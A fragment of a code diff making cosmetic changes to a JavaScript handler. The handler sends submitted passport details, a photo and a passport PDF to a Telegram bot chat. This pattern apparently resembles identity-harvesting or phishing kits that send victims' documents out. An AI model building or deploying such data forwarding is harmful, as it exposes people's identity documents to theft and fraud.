@@ -15,16 +15,14 @@ Passport: ${body.passport}
 Country: ${body.country}
 `;
 
-  // Send text
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
-    headers: {"Content-Type": "application/json"},
+    headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ chat_id, text })
   });
 
-  // Send photo
   if (body.photo) {
-    let form = new FormData();
+    const form = new FormData();
     form.append("chat_id", chat_id);
     form.append("photo", Buffer.from(body.photo, "base64"), {
       filename: "photo.jpg"
@@ -36,9 +34,8 @@ Country: ${body.country}
     });
   }
 
-  // Send PDF
   if (body.passportFile) {
-    let form = new FormData();
+    const form = new FormData();
     form.append("chat_id", chat_id);
     form.append("document", Buffer.from(body.passportFile, "base64"), {
       filename: "passport.pdf"
